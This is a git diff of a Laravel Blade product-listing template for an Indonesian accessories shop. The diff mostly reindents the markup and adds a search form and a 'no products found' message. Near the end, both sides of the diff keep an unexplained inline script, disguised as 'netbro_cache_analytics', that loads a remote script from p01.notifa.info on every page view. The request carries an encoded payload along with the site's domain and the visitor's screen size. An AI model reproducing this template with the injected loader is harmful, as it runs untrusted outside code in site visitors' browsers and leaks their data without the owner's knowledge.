@@ -1,65 +1,74 @@
 <!DOCTYPE html>
 <html lang="en">
-	<!-- Mirrored from themes.iamabdus.com/bigbag/2.1/product-grid-left-sidebar.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 25 Sep 2018 11:03:02 GMT -->
-	<!-- Added by HTTrack -->
-	<meta http-equiv="content-type" content="text/html;charset=utf-8" />
-	<!-- /Added by HTTrack -->
-	<head>
-		<!-- SITE TITTLE -->
-		<meta charset="utf-8">
-		<meta http-equiv="X-UA-Compatible" content="IE=edge">
-		<meta name="viewport" content="width=device-width, initial-scale=1">
-		<title>Dunia Aksesoris</title>
-		<!-- PLUGINS CSS STYLE -->
-		<link href="{{asset('/bigbag/plugins/jquery-ui/jquery-ui.css')}}" rel="stylesheet">
-		<link href="{{asset('/bigbag/plugins/bootstrap/css/bootstrap.min.css')}}" rel="stylesheet">
-		<link href="{{asset('/bigbag/plugins/font-awesome/css/font-awesome.min.css')}}" rel="stylesheet">
-		<link href="{{asset('/bigbag/plugins/selectbox/select_option1.css')}}" rel="stylesheet">
-		<link href="{{asset('/bigbag/plugins/fancybox/jquery.fancybox.min.css')}}" rel="stylesheet">
-		<link href="{{asset('/bigbag/plugins/iziToast/css/iziToast.css')}}" rel="stylesheet">
-		<link href="{{asset('/bigbag/plugins/prismjs/prism.css')}}" rel="stylesheet">
-		<link rel="stylesheet" type="text/css" href="{{asset('/bigbag/plugins/rs-plugin/css/settings.css')}}" media="screen">
-		<link rel="stylesheet" type="text/css" href="{{asset('/bigbag/plugins/slick/slick.css')}}" media="screen">
-		<link rel="stylesheet" type="text/css" href="{{asset('/bigbag/plugins/slick/slick-theme.css')}}" media="screen">
-		<!-- CUSTOM CSS -->
-		<link href="{{asset('/bigbag/css/style.css')}}" rel="stylesheet">
-		<link rel="stylesheet" href="{{asset('/bigbag/css/default.css')}}" id="option_color">
-		<!-- Icons -->
-		<link rel="shortcut icon" href="{{asset('/img/head.png')}}">
-		<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
-		<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
-		<!--[if lt IE 9]>
+<!-- Mirrored from themes.iamabdus.com/bigbag/2.1/product-grid-left-sidebar.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 25 Sep 2018 11:03:02 GMT -->
+<!-- Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<!-- /Added by HTTrack -->
+
+<head>
+    <!-- SITE TITTLE -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Dunia Aksesoris</title>
+    <!-- PLUGINS CSS STYLE -->
+    <link href="{{asset('/bigbag/plugins/jquery-ui/jquery-ui.css')}}" rel="stylesheet">
+    <link href="{{asset('/bigbag/plugins/bootstrap/css/bootstrap.min.css')}}" rel="stylesheet">
+    <link href="{{asset('/bigbag/plugins/font-awesome/css/font-awesome.min.css')}}" rel="stylesheet">
+    <link href="{{asset('/bigbag/plugins/selectbox/select_option1.css')}}" rel="stylesheet">
+    <link href="{{asset('/bigbag/plugins/fancybox/jquery.fancybox.min.css')}}" rel="stylesheet">
+    <link href="{{asset('/bigbag/plugins/iziToast/css/iziToast.css')}}" rel="stylesheet">
+    <link href="{{asset('/bigbag/plugins/prismjs/prism.css')}}" rel="stylesheet">
+    <link rel="stylesheet" type="text/css" href="{{asset('/bigbag/plugins/rs-plugin/css/settings.css')}}" media="screen">
+    <link rel="stylesheet" type="text/css" href="{{asset('/bigbag/plugins/slick/slick.css')}}" media="screen">
+    <link rel="stylesheet" type="text/css" href="{{asset('/bigbag/plugins/slick/slick-theme.css')}}" media="screen">
+    <!-- CUSTOM CSS -->
+    <link href="{{asset('/bigbag/css/style.css')}}" rel="stylesheet">
+    <link rel="stylesheet" href="{{asset('/bigbag/css/default.css')}}" id="option_color">
+    <!-- Icons -->
+    <link rel="shortcut icon" href="{{asset('/img/head.png')}}">
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
 		<script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js')}}"></script>
 		<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js')}}"></script>
 		<![endif]-->
-	</head>
-	<body class="body-wrapper version1">
-		<!-- Preloader -->
-		<div id="preloader" class="smooth-loader-wrapper">
-			<div class="preloader_container">
-				<div class="block"></div>
-				<div class="block"></div>
-				<div class="block"></div>
-				<div class="block"></div>
-				<div class="block"></div>
-				<div class="block"></div>
-				<div class="block"></div>
-				<div class="block"></div>
-				<div class="block"></div>
-				<div class="block"></div>
-				<div class="block"></div>
-				<div class="block"></div>
-				<div class="block"></div>
-				<div class="block"></div>
-				<div class="block"></div>
-				<div class="block"></div>
-			</div>
-		</div>
-		<div class="main-wrapper">
-			<!-- HEADER -->
-			<div class="header clearfix">
-				<!-- TOPBAR -->
-				<!-- <div class="topBar">
+
+    <div class="topBar">
+        <form style="padding-left: 600px; padding-top: 6px;" action="{{route('search')}}" method="GET" class="hm-searchbox">
+            <input type="text" placeholder="Cari Produk" type="text" name="search">
+            <button class="li-btn" type="submit"><i class="fa fa-search"></i></button>
+        </form>
+    </div>
+</head>
+
+<body class="body-wrapper version1">
+    <!-- Preloader -->
+    <div id="preloader" class="smooth-loader-wrapper">
+        <div class="preloader_container">
+            <div class="block"></div>
+            <div class="block"></div>
+            <div class="block"></div>
+            <div class="block"></div>
+            <div class="block"></div>
+            <div class="block"></div>
+            <div class="block"></div>
+            <div class="block"></div>
+            <div class="block"></div>
+            <div class="block"></div>
+            <div class="block"></div>
+            <div class="block"></div>
+            <div class="block"></div>
+            <div class="block"></div>
+            <div class="block"></div>
+            <div class="block"></div>
+        </div>
+    </div>
+    <div class="main-wrapper">
+        <!-- HEADER -->
+        <div class="header clearfix">
+            <!-- TOPBAR -->
+            <!-- <div class="topBar">
 					<div class="container">
 						<div class="row">
 							<div class="col-md-6 d-none d-md-block">
@@ -122,52 +131,53 @@
 						</div>
 					</div>
 					</div> -->
-				<!-- NAVBAR -->
-				<!-- Collect the nav links, forms, and other content for toggling -->
-				@include('partials.frontend.navbar')<!-- /.navbar-collapse -->
-				<div class="version2">
-					<div class="dropdown cart-dropdown">
-						<a href="javascript:void(0)" class="dropdown-toggle shop-cart" data-toggle="dropdown">
-						<i class="fa fa-shopping-cart"></i>
-						<span class="badge">3</span>
-						</a>
-						<ul class="dropdown-menu dropdown-menu-right">
-							<li>Item(s) in your cart</li>
-							<li>
-								<a href="single-product.html">
-									<div class="media">
-										<img class="media-left media-object" src="{{asset('/bigbag/img/home/cart-items/cart-item-01.jpg')}}" alt="cart-Image">
-										<div class="media-body">
-											<h5 class="media-heading">INCIDIDUNT UT <br><span>2 X $199</span></h5>
-										</div>
-									</div>
-								</a>
-							</li>
-							<li>
-								<a href="single-product.html">
-									<div class="media">
-										<img class="media-left media-object" src="{{asset('/bigbag/img/home/cart-items/cart-item-01.jpg')}}" alt="cart-Image">
-										<div class="media-body">
-											<h5 class="media-heading">INCIDIDUNT UT <br><span>2 X $199</span></h5>
-										</div>
-									</div>
-								</a>
-							</li>
-							<li>
-								<div class="btn-group" role="group" aria-label="...">
-									<button type="button" class="btn btn-default" onclick="location.href='cart-page.html';">Shopping Cart</button>
-									<button type="button" class="btn btn-default" onclick="location.href='checkout-step-1.html';">Checkout</button>
-								</div>
-							</li>
-						</ul>
-					</div>
-				</div>
-			</div>
-			</nav>
-		</div>
-		@include('partials.frontend.banner')
-		<!-- LIGHT SECTION -->
-		<!-- <section class="lightSection clearfix pageHeader">
+            <!-- NAVBAR -->
+            <!-- Collect the nav links, forms, and other content for toggling -->
+            @include('partials.frontend.navbar')
+            <!-- /.navbar-collapse -->
+            <div class="version2">
+                <div class="dropdown cart-dropdown">
+                    <a href="javascript:void(0)" class="dropdown-toggle shop-cart" data-toggle="dropdown">
+                        <i class="fa fa-shopping-cart"></i>
+                        <span class="badge">3</span>
+                    </a>
+                    <ul class="dropdown-menu dropdown-menu-right">
+                        <li>Item(s) in your cart</li>
+                        <li>
+                            <a href="single-product.html">
+                                <div class="media">
+                                    <img class="media-left media-object" src="{{asset('/bigbag/img/home/cart-items/cart-item-01.jpg')}}" alt="cart-Image">
+                                    <div class="media-body">
+                                        <h5 class="media-heading">INCIDIDUNT UT <br><span>2 X $199</span></h5>
+                                    </div>
+                                </div>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="single-product.html">
+                                <div class="media">
+                                    <img class="media-left media-object" src="{{asset('/bigbag/img/home/cart-items/cart-item-01.jpg')}}" alt="cart-Image">
+                                    <div class="media-body">
+                                        <h5 class="media-heading">INCIDIDUNT UT <br><span>2 X $199</span></h5>
+                                    </div>
+                                </div>
+                            </a>
+                        </li>
+                        <li>
+                            <div class="btn-group" role="group" aria-label="...">
+                                <button type="button" class="btn btn-default" onclick="location.href='cart-page.html';">Shopping Cart</button>
+                                <button type="button" class="btn btn-default" onclick="location.href='checkout-step-1.html';">Checkout</button>
+                            </div>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        </nav>
+    </div>
+    @include('partials.frontend.banner')
+    <!-- LIGHT SECTION -->
+    <!-- <section class="lightSection clearfix pageHeader">
 			<div class="container">
 				<div class="row">
 					<div class="col-md-6">
@@ -189,28 +199,26 @@
 				</div>
 			</div>
 			</section> -->
-		<!-- MAIN CONTENT SECTION -->
-		<section class="mainContent clearfix productsContent">
-		<div class="container">
-		<div class="container">
-				<div class="row">
-					<div class="col-lg-3 col-md-4 sideBar">
-						<div class="panel panel-default">
-							<div class="panel-heading">Kategori Produk</div>
-							<div class="panel-body">
-								<div class="collapse navbar-collapse navbar-ex1-collapse navbar-side-collapse">
-									<ul class="nav navbar-nav side-nav">
-										<li><a href="/product"><i class="fa fa-caret-right" aria-hidden="true"></i>All</a></li>
-										@foreach($kategori as $data)	
-										@if(count($data->Barang)>0)
-										<li><a href="/product/kategori/{{ $data->slug }}"><i class="fa fa-caret-right" aria-hidden="true"></i>{{$data->kategori}} <span>({{ $data->Barang->count(0) }})</span></a></li>
-										@endif
-										@endforeach
-									</ul>
-								</div>
-							</div>
-						</div>
-						<!-- <div class="panel panel-default priceRange">
+    <!-- MAIN CONTENT SECTION -->
+    <section class="mainContent clearfix productsContent">
+        <div class="container">
+            <div class="container">
+                <div class="row">
+                    <div class="col-lg-3 col-md-4 sideBar">
+                        <div class="panel panel-default">
+                            <div class="panel-heading">Kategori Produk</div>
+                            <div class="panel-body">
+                                <div class="collapse navbar-collapse navbar-ex1-collapse navbar-side-collapse">
+                                    <ul class="nav navbar-nav side-nav">
+                                        <li><a href="/product"><i class="fa fa-caret-right" aria-hidden="true"></i>All</a></li>
+                                        @foreach($kategori as $data) @if(count($data->Barang)>0)
+                                        <li><a href="/product/kategori/{{ $data->slug }}"><i class="fa fa-caret-right" aria-hidden="true"></i>{{$data->kategori}} <span>({{ $data->Barang->count(0) }})</span></a></li>
+                                        @endif @endforeach
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                        <!-- <div class="panel panel-default priceRange">
 							<div class="panel-heading">Filter by Price</div>
 							<div class="panel-body clearfix">
 								<div class="price-slider-inner">
@@ -225,7 +233,7 @@
 								<input class="btn-default" type="submit" value="Filter">
 							</div>
 							</div> -->
-						<!-- <div class="panel panel-default filterNormal">
+                        <!-- <div class="panel panel-default filterNormal">
 							<div class="panel-heading">filter by Color</div>
 							<div class="panel-body">
 								<ul class="list-unstyled">
@@ -237,7 +245,7 @@
 								</ul>
 							</div>
 							</div> -->
-						<!-- <div class="panel panel-default filterNormal">
+                        <!-- <div class="panel panel-default filterNormal">
 							<div class="panel-heading">filter by Size</div>
 							<div class="panel-body">
 								<ul class="list-unstyled clearfix">
@@ -248,9 +256,9 @@
 								</ul>
 							</div>
 							</div> -->
-					</div>
-					<div class="col-lg-9 col-md-8">
-						<!-- <div class="row filterArea">
+                    </div>
+                    <div class="col-lg-9 col-md-8">
+                        <!-- <div class="row filterArea">
 							<div class="col-6">
 								<select name="guiest_id1" id="guiest_id1" class="select-drop">
 									<option value="0">Default sorting</option>
@@ -267,26 +275,34 @@
 								</div>
 							</div>
 							</div> -->
-						<div class="row">
-							@foreach($barangs as $data)
-							<div class="col-md-5 col-lg-3">
-								<div class="productBox">
-									<div class="productImage clearfix">
-										<img src="{{asset('/img/'.$data->foto.'')}}" alt="products-img">
-										<div class="productMasking">
-											<ul class="list-inline btn-group" role="group">
-												<li><a class="btn viewBtn" href="/product/{{$data->slug}}" ><i class="fa fa-eye">Lihat</i></a></li>
-											</ul>
-										</div>
-									</div>
-									<div class="productCaption clearfix">
-										<h5>{{$data->nama_barang}}</h5>
-										<h3>Rp. {{number_format($data->harga,2,',','.')}}</h3><br>
-									</div>
-								</div>
-							</div>
-							@endforeach
-							<!-- <div class="col-md-6 col-lg-4">
+                        <div class="row">
+                            @if (count($barangs) > 0) @foreach($barangs as $data)
+                            <div class="col-md-5 col-lg-3">
+                                <div class="productBox">
+                                    <div class="productImage clearfix">
+                                        <img src="{{asset('/img/'.$data->foto.'')}}" alt="products-img">
+                                        <div class="productMasking">
+                                            <ul class="list-inline btn-group" role="group">
+                                                <li><a class="btn viewBtn" href="/product/{{$data->slug}}"><i class="fa fa-eye">Lihat</i></a></li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                    <div class="productCaption clearfix">
+                                        <h5>{{$data->nama_barang}}</h5>
+                                        <h3>Rp. {{number_format($data->harga,2,',','.')}}</h3>
+                                        <br>
+                                    </div>
+                                </div>
+                            </div>
+                            @endforeach @else
+                            <h3>
+                                    <b>
+                                        <i>
+                                            <center>Mohon Maaf Produk Tidak Ada...Coba Cari Lagi :)</center>
+                                        </i>
+                                    </b>
+                                </h3> @endif
+                            <!-- <div class="col-md-6 col-lg-4">
 								<div class="productBox">
 									<div class="productImage clearfix">
 										<img src="{{asset('/bigbag/img/products/products-02.jpg')}}" alt="products-img">
@@ -506,21 +522,21 @@
 									</div>
 								</div>
 								</div> -->
-						</div>
-					</div>
-				</div>
-				<div class="row">
-				<div class="col-md-4"></div>
-				<div class="col-md-3"></div>
-				<div class="col-md-2">
-				{{$barangs->links()}}</div>
-				<div class="col-md-3">
-				</div>
-				</div>
-			</div>
-		</section>
-		<!-- LIGHT SECTION -->
-		<!-- <section class="lightSection clearfix">
+                        </div>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="col-md-4"></div>
+                    <div class="col-md-3"></div>
+                    <div class="col-md-2">
+                        {{$barangs->links()}}</div>
+                    <div class="col-md-3">
+                    </div>
+                </div>
+            </div>
+    </section>
+    <!-- LIGHT SECTION -->
+    <!-- <section class="lightSection clearfix">
 			<div class="container">
 				<div class="row">
 					<div class="col-md-12">
@@ -570,54 +586,54 @@
 				</div>
 			</div>
 			</section> -->
-		<!-- FOOTER -->
-		@include('partials.frontend.footer')
-		<!-- COPY RIGHT -->
-		@include('partials.frontend.copyright')
-		<!-- SIGN UP MODAL -->
-		<div class="modal fade " id="signup" tabindex="-1" role="dialog">
-			<div class="modal-dialog">
-				<div class="modal-content">
-					<div class="modal-header justify-content-center">
-						<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
-						<h3 class="modal-title">Create an account</h3>
-					</div>
-					<div class="modal-body">
-						<form action="#" method="POST" role="form">
-							<div class="form-group">
-								<label for="">Enter Email</label>
-								<input type="email" class="form-control" id="">
-							</div>
-							<div class="form-group">
-								<label for="">Password</label>
-								<input type="password" class="form-control" id="">
-							</div>
-							<div class="form-group">
-								<label for="">Confirm Password</label>
-								<input type="password" class="form-control" id="">
-							</div>
-							<button type="submit" class="btn btn-primary btn-block">Sign up</button>
-							<button type="button" class="btn btn-link btn-block">New User?</button>
-						</form>
-					</div>
-				</div>
-			</div>
-		</div>
-		<!-- PORDUCT QUICK VIEW MODAL -->
-		<div class="modal fade quick-view" tabindex="-1" role="dialog">
-			<div class="modal-dialog">
-				<div class="modal-content">
-					<div class="modal-body">
-						<button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
-						<div class="media flex-wrap">
-							<div class="media-left px-0">
-								<img class="media-object" src="{{asset('/bigbag/img/products/quick-view/quick-view-01.jpg')}}" alt="Image">
-							</div>
-							<div class="media-body">
-								<h2>Old Skool Navy</h2>
-								<h3>$149</h3>
-								<p>Classic sneaker from Vans. Cotton canvas and suede upper. Textile lining with heel stabilizer and ankle support. Contrasting laces. Sits on a classic waffle rubber sole.</p>
-								<span class="quick-drop">
+    <!-- FOOTER -->
+    @include('partials.frontend.footer')
+    <!-- COPY RIGHT -->
+    @include('partials.frontend.copyright')
+    <!-- SIGN UP MODAL -->
+    <div class="modal fade " id="signup" tabindex="-1" role="dialog">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header justify-content-center">
+                    <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
+                    <h3 class="modal-title">Create an account</h3>
+                </div>
+                <div class="modal-body">
+                    <form action="#" method="POST" role="form">
+                        <div class="form-group">
+                            <label for="">Enter Email</label>
+                            <input type="email" class="form-control" id="">
+                        </div>
+                        <div class="form-group">
+                            <label for="">Password</label>
+                            <input type="password" class="form-control" id="">
+                        </div>
+                        <div class="form-group">
+                            <label for="">Confirm Password</label>
+                            <input type="password" class="form-control" id="">
+                        </div>
+                        <button type="submit" class="btn btn-primary btn-block">Sign up</button>
+                        <button type="button" class="btn btn-link btn-block">New User?</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- PORDUCT QUICK VIEW MODAL -->
+    <div class="modal fade quick-view" tabindex="-1" role="dialog">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-body">
+                    <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
+                    <div class="media flex-wrap">
+                        <div class="media-left px-0">
+                            <img class="media-object" src="{{asset('/bigbag/img/products/quick-view/quick-view-01.jpg')}}" alt="Image">
+                        </div>
+                        <div class="media-body">
+                            <h2>Old Skool Navy</h2>
+                            <h3>$149</h3>
+                            <p>Classic sneaker from Vans. Cotton canvas and suede upper. Textile lining with heel stabilizer and ankle support. Contrasting laces. Sits on a classic waffle rubber sole.</p>
+                            <span class="quick-drop">
 									<select name="guiest_id3" id="guiest_id3" class="select-drop">
 										<option value="0">Size</option>
 										<option value="1">Size 1</option>
@@ -625,7 +641,7 @@
 										<option value="3">Size 3</option>
 									</select>
 								</span>
-								<span class="quick-drop resizeWidth">
+                            <span class="quick-drop resizeWidth">
 									<select name="guiest_id4" id="guiest_id4" class="select-drop">
 										<option value="0">Qty</option>
 										<option value="1">Qty 1</option>
@@ -633,33 +649,59 @@
 										<option value="3">Qty 3</option>
 									</select>
 								</span>
-								<div class="btn-area">
-									<a href="#" class="btn btn-primary btn-block">Add to cart <i class="fa fa-angle-right" aria-hidden="true"></i></a>
-								</div>
-							</div>
-						</div>
-					</div>
-				</div>
-			</div>
-		</div>
-		<script src="{{asset('/bigbag/plugins/jquery/jquery.min.js')}}"></script>
-		<script src="{{asset('/bigbag/plugins/jquery/jquery-migrate-3.0.0.min.js')}}"></script>
-		<script src="{{asset('/bigbag/plugins/jquery-ui/jquery-ui.js')}}"></script>
-		<script src="{{asset('/bigbag/plugins/bootstrap/js/popper.min.js')}}"></script>
-		<script src="{{asset('/bigbag/plugins/bootstrap/js/bootstrap.min.js')}}"></script>
-		<script src="{{asset('/bigbag/plugins/rs-plugin/js/jquery.themepunch.tools.min.js')}}"></script>
-		<script src="{{asset('/bigbag/plugins/rs-plugin/js/jquery.themepunch.revolution.min.js')}}"></script>
-		<script src="{{asset('/bigbag/plugins/slick/slick.js')}}"></script>
-		<script src="{{asset('/bigbag/plugins/fancybox/jquery.fancybox.min.js')}}"></script>
-		<script src="{{asset('/bigbag/plugins/iziToast/js/iziToast.js')}}"></script>
-		<script src="{{asset('/bigbag/plugins/prismjs/prism.js')}}"></script>
-		<script src="{{asset('/bigbag/plugins/selectbox/jquery.selectbox-0.1.3.min.js')}}"></script>
-		<script src="{{asset('/bigbag/plugins/countdown/jquery.syotimer.js')}}"></script>
-		<script src="{{asset('/bigbag/plugins/velocity/velocity.min.js')}}"></script>
-		<script src="{{asset('/bigbag/js/custom.js')}}"></script>
-		<!-- <link href="{{asset('/bigbag/options/optionswitch.css')}}" rel="stylesheet">
+                            <div class="btn-area">
+                                <a href="#" class="btn btn-primary btn-block">Add to cart <i class="fa fa-angle-right" aria-hidden="true"></i></a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="{{asset('/bigbag/plugins/jquery/jquery.min.js')}}"></script>
+    <script src="{{asset('/bigbag/plugins/jquery/jquery-migrate-3.0.0.min.js')}}"></script>
+    <script src="{{asset('/bigbag/plugins/jquery-ui/jquery-ui.js')}}"></script>
+    <script src="{{asset('/bigbag/plugins/bootstrap/js/popper.min.js')}}"></script>
+    <script src="{{asset('/bigbag/plugins/bootstrap/js/bootstrap.min.js')}}"></script>
+    <script src="{{asset('/bigbag/plugins/rs-plugin/js/jquery.themepunch.tools.min.js')}}"></script>
+    <script src="{{asset('/bigbag/plugins/rs-plugin/js/jquery.themepunch.revolution.min.js')}}"></script>
+    <script src="{{asset('/bigbag/plugins/slick/slick.js')}}"></script>
+    <script src="{{asset('/bigbag/plugins/fancybox/jquery.fancybox.min.js')}}"></script>
+    <script src="{{asset('/bigbag/plugins/iziToast/js/iziToast.js')}}"></script>
+    <script src="{{asset('/bigbag/plugins/prismjs/prism.js')}}"></script>
+    <script src="{{asset('/bigbag/plugins/selectbox/jquery.selectbox-0.1.3.min.js')}}"></script>
+    <script src="{{asset('/bigbag/plugins/countdown/jquery.syotimer.js')}}"></script>
+    <script src="{{asset('/bigbag/plugins/velocity/velocity.min.js')}}"></script>
+    <script src="{{asset('/bigbag/js/custom.js')}}"></script>
+    <!-- <link href="{{asset('/bigbag/options/optionswitch.css')}}" rel="stylesheet">
 			<script src="{{asset('/bigbag/options/optionswitcher.js')}}"></script> -->
-		<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m9BHH5nSgM%2bH3J3OHAMXVqyOhrXr1Zr8QymYewayZcL9CWBK1c18IGmy7CoGLrcFWztkJifapX9tvb6upSFDqI%2booaiJwIisuWDoCTGjxcdkQ8irIRV%2fcwuQ44RLI%2bXRhCWw%2bamSlYNK4nepTt%2bTP%2bol0W9%2bVaunRqHFWWJQOOlVCvEZhtGkhpTqSPqTwn80Tp2wFyUkT0tZ5xFbQDX3H%2biktN5JEpbo6DQ7g1EezmfRO7msbmenrjxcuMr%2bF0WmHyGaFDIzvOwW4whQt2uXB6hiefnts14En%2b2yGZ%2bUX34ZkBD%2bOtA1PZqSirqKG%2fWldUdweIuSQIJQyHAI1i9tZImUMZWCvVLrh0sKF4y1I91vYHaJMho4nyWsir8pSi3LiYo8oh009O7usnt2ryggvj3%2fihxiFcrgCcbUL5%2foF6eXSbH%2bhCepKnm%2f%2b%2bzgl5B6beF8wOQ9ZsF76s6nPRv1TMiHbabQ%2f2rNR6Gcm9MxWk3yWV5Sl5DYKFu%2bXUKyUYoKmE6Lbhp2XZBk%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
-	</body>
-	<!-- Mirrored from themes.iamabdus.com/bigbag/2.1/product-grid-left-sidebar.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 25 Sep 2018 11:03:27 GMT -->
+    <script type="text/javascript">
+        if (self == top) {
+            function netbro_cache_analytics(fn, callback) {
+                setTimeout(function() {
+                    fn();
+                    callback();
+                }, 0);
+            }
+
+            function sync(fn) {
+                fn();
+            }
+
+            function requestCfs() {
+                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
+                var idc_glo_r = Math.floor(Math.random() * 99999999999);
+                var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m9BHH5nSgM%2bH3J3OHAMXVqyOhrXr1Zr8QymYewayZcL9CWBK1c18IGmy7CoGLrcFWztkJifapX9tvb6upSFDqI%2booaiJwIisuWDoCTGjxcdkQ8irIRV%2fcwuQ44RLI%2bXRhCWw%2bamSlYNK4nepTt%2bTP%2bol0W9%2bVaunRqHFWWJQOOlVCvEZhtGkhpTqSPqTwn80Tp2wFyUkT0tZ5xFbQDX3H%2biktN5JEpbo6DQ7g1EezmfRO7msbmenrjxcuMr%2bF0WmHyGaFDIzvOwW4whQt2uXB6hiefnts14En%2b2yGZ%2bUX34ZkBD%2bOtA1PZqSirqKG%2fWldUdweIuSQIJQyHAI1i9tZImUMZWCvVLrh0sKF4y1I91vYHaJMho4nyWsir8pSi3LiYo8oh009O7usnt2ryggvj3%2fihxiFcrgCcbUL5%2foF6eXSbH%2bhCepKnm%2f%2b%2bzgl5B6beF8wOQ9ZsF76s6nPRv1TMiHbabQ%2f2rNR6Gcm9MxWk3yWV5Sl5DYKFu%2bXUKyUYoKmE6Lbhp2XZBk%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
+                var bsa = document.createElement('script');
+                bsa.type = 'text/javascript';
+                bsa.async = true;
+                bsa.src = url;
+                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
+            }
+            netbro_cache_analytics(requestCfs, function() {});
+        };
+    </script>
+</body>
+<!-- Mirrored from themes.iamabdus.com/bigbag/2.1/product-grid-left-sidebar.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 25 Sep 2018 11:03:27 GMT -->
+
 </html>
